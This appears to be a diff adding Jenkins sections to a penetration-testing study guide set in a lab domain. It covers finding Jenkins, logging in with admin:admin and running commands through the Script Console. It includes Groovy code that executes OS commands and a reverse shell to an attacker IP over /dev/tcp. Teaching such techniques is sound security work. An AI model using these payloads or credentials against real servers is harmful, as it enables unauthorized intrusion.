@@ -21,7 +21,11 @@ This document outlines common techniques for identifying and exploiting vulnerab
   - [Servlet Containers/Software Development](#servlet-containerssoftware-development)
     - [Tomcat - Discovery and Enumeration](#tomcat---discovery-and-enumeration)
     - [Attacking Tomcat](#attacking-tomcat)
-
+    - [Jenkins - Discovery and Enumeration](#jenkins---discovery-and-enumeration)
+    - [Attacking Jenkins](#attacking-jenkins)
+  
+  - [Infrastructure/Network Monitoring](#infrastructurenetwork-monitoring)
+    - [Splunk - Discovery and Enumeration](#splunk---discovery-and-enumeration)
 ---
 
 ## Overview
@@ -1004,3 +1008,89 @@ Apache Tomcat is a **high-value target** in both internal and external penetrati
 If access is obtained, it can typically be converted into **full remote code execution within minutes**. Tomcat frequently runs with **high privileges** (e.g., `root` or `SYSTEM`), making it an excellent foothold for further lateral movement in both Linux environments and domain-joined Windows systems.
 
 ---
+
+### Jenkins - Discovery and Enumeration
+
+Jenkins is an open-source **automation server** written in Java that is commonly used to build, test, and deploy software projects. It typically runs as a web application inside a **servlet container** such as **Apache Tomcat**.
+
+Over the years, Jenkins has been affected by numerous vulnerabilities, including several that allow **remote code execution (RCE)**, sometimes even **without authentication**.
+
+By default, Jenkins listens on TCP port `8080`. It may also use port `5000` for communication with distributed build agents (slave nodes).
+
+A Jenkins instance is easy to identify by its distinctive login page:
+
+![Filtered output](images/jenkins.PNG)
+
+The default Jenkins username is `admin`, but the password is not fixed during installation. In real-world environments—especially during **internal penetration tests**—it is common to encounter Jenkins instances that:
+
+- Use weak or default credentials (e.g., `admin:admin`)
+- Have authentication completely disabled
+
+In this scenario, the target Jenkins instance is protected by weak credentials:
+
+```
+admin:admin
+```
+
+![Filtered output](images/jenkins2.PNG)
+
+After successful authentication, the Jenkins version can be fingerprinted directly from the page source. The version is often exposed in a `data-version` attribute:
+
+```
+data-version="2.303.1"
+```
+
+![Filtered output](images/jenkins3.PNG)
+
+Identifying the exact Jenkins version is critical, as it allows attackers to research **known vulnerabilities**, public exploits, and misconfigurations that may lead to privilege escalation or remote code execution.
+
+---
+
+### Attacking Jenkins
+
+In the previous section, we identified that the target is running Jenkins and is protected by **weak credentials** (`admin:admin`). Jenkins is frequently installed and executed in the context of **high-privileged accounts** such as `root` (Linux) or `SYSTEM` (Windows), making successful exploitation especially impactful.
+
+A common and reliable method of achieving **remote code execution** in Jenkins is through the **Script Console**. The Script Console allows authenticated administrators to execute **arbitrary Groovy scripts** within the Jenkins controller runtime. **Apache Groovy** is an object-oriented scripting language that is fully compatible with Java, allowing direct interaction with the underlying operating system.
+
+The Script Console is accessible through the following endpoint:
+
+```
+http://jenkins.inlanefreight.local:8000/script
+```
+
+![Filtered output](images/jenkins4.PNG)
+
+The following Groovy script executes the `id` command on the underlying operating system and prints the output to the console:
+
+```groovy
+def cmd = 'id'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println sout
+```
+
+Successful output confirms arbitrary command execution on the Jenkins host.
+
+![Filtered output](images/jenkins5.PNG)
+
+The Script Console can also be leveraged to obtain an interactive shell. The following Groovy script spawns a **reverse shell** back to the attacker:
+
+```groovy
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.4/1337;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+
+After starting a listener on the attacker machine, this results in an **interactive shell** running in the security context of the Jenkins service account.
+
+![Filtered output](images/jenkins6.PNG)
+
+---
+
+## Infrastructure/Network Monitoring
+
+---
+
+### Splunk - Discovery and Enumeration
